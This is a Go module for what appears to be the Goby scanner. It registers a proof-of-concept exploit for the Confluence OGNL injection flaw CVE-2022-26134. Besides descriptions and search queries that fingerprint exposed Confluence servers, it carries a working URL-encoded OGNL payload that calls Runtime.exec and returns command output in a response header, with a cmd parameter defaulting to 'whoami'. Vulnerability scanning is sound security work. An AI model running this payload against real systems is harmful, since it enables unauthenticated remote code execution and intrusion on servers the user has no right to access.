package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Atlassian Confluence Webwork OGNL Inject (CVE-2022-26134)",
    "Description": "<p>Atlassian confluence server is a server version of atlassian company that has enterprise knowledge management functions and supports collaborative software for building enterprise wikis. </p><p>Atlassian confluence has an ognl injection vulnerability that allows authenticated users (in some cases unauthenticated users) to execute arbitrary code on the confluence server.</p>",
    "Impact": "Atlassian Confluence Webwork OGNL Inject (CVE-2022-26134)",
    "Recommendation": "<p>At present, the official is making relevant security patch updates. It is recommended to pay attention to the official information and update it in a timely manner.</p><p>Website: <a href=\"https://www.atlassian.com/zh/software/confluence\">https://www.atlassian.com/zh/software/confluence</a></p>",
    "Product": "atlassian-confluence",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "Atlassian Confluence Webwork OGNL 注入漏洞 (CVE-2022-26134)",
            "Description": "<p>Atlassian Confluence Server是Atlassian公司的一套具有企业知识管理功能，并支持用于构建企业WiKi的协同软件的服务器版本。</p><p>Atlassian Confluence存在一个 OGNL 注入漏洞，允许经过身份验证的用户（在某些情况下未经身份验证的用户）在 Confluence 服务器执行任意代码。<br></p>",
            "Impact": "<p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Atlassian Confluence存在一个 OGNL 注入漏洞，允许经过身份验证的用户（在某些情况下未经身份验证的用户）在 Confluence 服务器执行任意代码。攻击者可以使用攻击代码在服务器上执行任意命令。</span><br></p>",
            "Recommendation": "<p>目前官方正在制作相关安全补丁更新，建议关注官方消息，及时更新。</p><p>官方网址：<a href=\"https://www.atlassian.com/zh/software/confluence\" target=\"_blank\">https://www.atlassian.com/zh/software/confluence</a></p>",
            "Product": "atlassian-confluence",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Atlassian Confluence Webwork OGNL Inject (CVE-2022-26134)",
            "Description": "<p>Atlassian confluence server is a server version of atlassian company that has enterprise knowledge management functions and supports collaborative software for building enterprise wikis.&nbsp;</p><p>Atlassian confluence has an ognl injection vulnerability that allows authenticated users (in some cases unauthenticated users) to execute arbitrary code on the confluence server.<br></p>",
            "Impact": "Atlassian Confluence Webwork OGNL Inject (CVE-2022-26134)",
            "Recommendation": "<p><span style=\"color: rgb(0, 0, 0); font-size: 16px;\">At present, the official is making relevant security patch updates. It is recommended to pay attention to the official information and update it in a timely manner.</span></p><p>Website:&nbsp;<a href=\"https://www.atlassian.com/zh/software/confluence\" target=\"_blank\">https://www.atlassian.com/zh/software/confluence</a></p>",
            "Product": "atlassian-confluence",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "(header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "GobyQuery": "(header=\"X-Confluence-\" && header!=\"TP-LINK Router UPnP\") || (banner=\"X-Confluence-\" && banner!=\"TP-LINK Router UPnP\") || (body=\"name=\\\"confluence-base-url\\\"\" && body=\"id=\\\"com-atlassian-confluence\") || title=\"Atlassian Confluence\" || (title==\"Errors\" && body=\"Confluence\")",
    "Author": "su18@javaweb.org",
    "Homepage": "https://www.atlassian.com/zh/software/confluence",
    "DisclosureDate": "2022-06-04",
    "References": [
        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2022-26134"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20TTTest%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Test-Response%22%2C%23a%29%29%7D/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "X-Test-Response: TTTest",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22echo%20TTTest%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Test-Response%22%2C%23a%29%29%7D/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "X-Test-Response: TTTest",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10366"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
